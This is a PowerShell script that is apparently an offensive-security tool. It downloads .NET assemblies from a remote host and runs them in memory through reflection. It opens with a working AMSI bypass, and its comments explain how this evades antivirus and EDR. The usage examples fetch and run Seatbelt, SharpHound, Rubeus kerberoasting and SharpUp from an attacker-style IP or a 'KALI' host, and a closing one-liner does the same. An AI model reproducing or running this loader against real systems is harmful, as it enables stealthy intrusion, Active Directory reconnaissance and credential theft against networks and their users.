# ============================================================
# Load-Assembly.ps1 — Simple in-memory .NET assembly loader
# ============================================================
# WHAT THIS DOES:
#   Downloads a .NET assembly (.exe or .dll) from a URL into
#   memory as a byte array, then loads and executes it using
#   [System.Reflection.Assembly]::Load(). Nothing touches disk.
#
# WHY REFLECTION LOADING:
#   Assembly.Load() accepts raw bytes — it never reads from disk.
#   AV/EDR products that monitor file creation or process creation
#   won't see a new process or file hit. The assembly runs entirely
#   inside the current PowerShell process.
#
#   This is how you run Mimikatz, SharpHound, Seatbelt, etc.
#   without dropping binaries.
#
# LIMITATIONS:
#   - AMSI can still scan the bytes before Load() — bypass AMSI first
#   - CLR hooks (e.g. Cobalt Strike's EDR bypass) may intercept Load()
#   - Some tools need specific arguments — check each tool's Main() signature
# ============================================================

# --- Bypass AMSI first (required before loading flagged tools) ---
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

# --- Method 1: Load from URL ---
function Load-AssemblyFromURL {
    param(
        [Parameter(Mandatory=$true)] [string]$Url,
        [Parameter(Mandatory=$false)] [string[]]$Args = @()
    )
    $wc = New-Object System.Net.WebClient
    $bytes = $wc.DownloadData($Url)
    $asm = [System.Reflection.Assembly]::Load($bytes)
    $asm.EntryPoint.Invoke($null, @(, $Args))
}

# --- Method 2: Load from disk (testing/staging) ---
function Load-AssemblyFromDisk {
    param(
        [Parameter(Mandatory=$true)] [string]$Path,
        [Parameter(Mandatory=$false)] [string[]]$Args = @()
    )
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $asm = [System.Reflection.Assembly]::Load($bytes)
    $asm.EntryPoint.Invoke($null, @(, $Args))
}

# ============================================================
# USAGE EXAMPLES:
# ============================================================

# Run Seatbelt (situational awareness):
# Load-AssemblyFromURL -Url "http://192.168.45.202/Seatbelt.exe" -Args @("-group=all")

# Run SharpHound (AD enumeration):
# Load-AssemblyFromURL -Url "http://192.168.45.202/SharpHound.exe" -Args @("-c", "All", "--zipfilename", "loot.zip")

# Run Rubeus (Kerberos attacks):
# Load-AssemblyFromURL -Url "http://192.168.45.202/Rubeus.exe" -Args @("kerberoast", "/outfile:hashes.txt")

# Run SharpUp (privilege escalation checks):
# Load-AssemblyFromURL -Url "http://192.168.45.202/SharpUp.exe" -Args @("audit")

# Run a custom compiled .NET tool:
# Load-AssemblyFromURL -Url "http://192.168.45.202/mytool.exe"

# ============================================================
# QUICK ONE-LINER (no function needed):
# ============================================================
# $b=(New-Object System.Net.WebClient).DownloadData("http://KALI/tool.exe")
# [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@("arg1","arg2")))
